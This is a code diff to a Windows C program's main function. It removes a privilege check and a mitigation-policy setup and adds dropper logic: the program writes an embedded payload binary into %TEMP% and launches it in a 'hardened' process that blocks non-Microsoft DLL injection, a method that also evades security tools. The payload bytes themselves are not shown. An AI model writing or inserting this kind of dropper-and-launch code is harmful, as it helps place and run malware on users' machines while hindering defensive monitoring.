@@ -1,30 +1,38 @@
-#include "../../include/core/common.h"
-#include "../../include/core/mitigation_option.h"
+#include "../../include/core/payload.h"
+#include "../../include/utils/dropper.h"
 #include "../../include/utils/system.h"
+#include "../../include/utils/thread.h"
 
 int main(void) {
-
   print_banner();
 
-  elevation_status_t status = is_elevated();
-
-  switch (status) {
-  case ELEVATION_ELEVATED:
-    pretty_print(LOG_SUCCESS, "Administrator privileges detected");
-    break;
-  case ELEVATION_NOT_ELEVATED:
-    pretty_print(LOG_WARNING,
-                 "Standard user privileges - some operations may fail");
-    return 1;
-  case ELEVATION_ERROR:
+  // Elevation check — warn but do not abort; most stages work without admin
+  elevation_status_t elev = is_elevated();
+  if (elev == ELEVATION_ELEVATED) {
+    pretty_print(LOG_SUCCESS, "Running as Administrator");
+  } else if (elev == ELEVATION_NOT_ELEVATED) {
+    pretty_print(LOG_WARNING, "Not elevated — some operations may fail");
+  } else {
     pretty_print(LOG_ERROR, "Could not determine elevation status");
     return 1;
   }
 
-  set_mitigation_policy();
+  // Resolve drop path under %TEMP%
+  char drop_path[MAX_PATH];
+  if (resolve_temp_path(PAYLOAD_FILENAME, drop_path, sizeof(drop_path)) != 0)
+    return 1;
 
-  printf("\nPress Enter to exit...");
-  getchar();
+  // Write payload to disk
+  if (drop_binary(drop_path, PAYLOAD_DATA, PAYLOAD_SIZE) != 0)
+    return 1;
+
+  // Launch payload in a hardened process (blocks non-Microsoft DLL injection)
+  DWORD slot;
+  if (spawn_binary_hardened(drop_path, NULL, &slot) != 0)
+    return 1;
+
+  thread_wait(slot, 5000);
+  thread_cleanup();
 
   return 0;
 }
